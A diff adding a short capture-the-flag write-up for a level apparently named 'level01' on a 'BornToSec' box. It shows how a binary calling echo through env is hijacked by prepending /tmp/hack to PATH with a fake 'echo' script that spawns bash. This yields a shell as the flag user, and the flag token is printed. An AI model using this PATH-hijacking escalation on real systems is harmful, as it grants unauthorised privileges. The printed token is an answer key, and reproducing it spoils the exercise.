@@ -1,0 +1,39 @@
+# cat level01.s
+```
+	...
+	.LC0:
+		.string	"/usr/bin/env echo Try to understand this level01.s .."
+		.text
+		.globl	main
+		.type	main, @function
+	...
+```
+
+# we can see the dev use the env to call the echo
+# he didnt use /bin/echo so we can fake echo function by changing $PATH from env
+```
+	PATH=/tmp/hack/:$PATH
+```
+# after that we just need to change echo by whatever
+```
+	touch /tmp/hack/echo
+	vi /tmp/hack/echo
+```
+# here we want a shell
+```
+	#!/bin/sh
+	bash
+```
+# then just run ~/level01
+# getflag
+```
+	level01@BornToSec:~$ cat /tmp/tommy/echo
+	#!/bin/sh
+	bash
+
+	level01@BornToSec:~$ ./level01
+	bash: /home/user/level01/.bashrc: Permission denied
+	
+	flag01@BornToSec:~$ getflag
+	Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+```
